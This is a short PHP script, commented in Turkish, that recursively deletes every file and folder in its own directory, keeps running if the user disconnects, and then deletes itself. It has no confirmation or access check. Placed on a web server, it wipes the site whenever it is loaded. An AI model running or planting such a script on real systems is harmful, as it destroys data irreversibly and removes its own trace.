<?php
function deleteFolder($folderPath) {
    if (!is_dir($folderPath)) {
        return;
    }

    $files = array_diff(scandir($folderPath), array('.', '..'));
    foreach ($files as $file) {
        $filePath = $folderPath . DIRECTORY_SEPARATOR . $file;
        if (is_dir($filePath)) {
            deleteFolder($filePath); // Klasörse içini sil
        } else {
            unlink($filePath); // Dosya ise sil
        }
    }
    rmdir($folderPath); // Boş klasörü sil
}

$directory = __DIR__; // Bulunduğu dizin
$script = __FILE__; // Çalışan PHP dosyasının yolu

$files = array_diff(scandir($directory), array('.', '..', basename($script))); // Önce diğerlerini sil

foreach ($files as $file) {
    $filePath = $directory . DIRECTORY_SEPARATOR . $file;
    if (is_dir($filePath)) {
        deleteFolder($filePath);
    } else {
        unlink($filePath);
    }
}

// Kendi dosyasını en son silmesi için bir komut çalıştır
ignore_user_abort(true); // Kullanıcı bağlantıyı kesse bile çalıştır
unlink($script); // Kendi dosyasını sil

echo "Tüm dosyalar ve dizinler silindi. Bu betik artık mevcut değil!";
?>
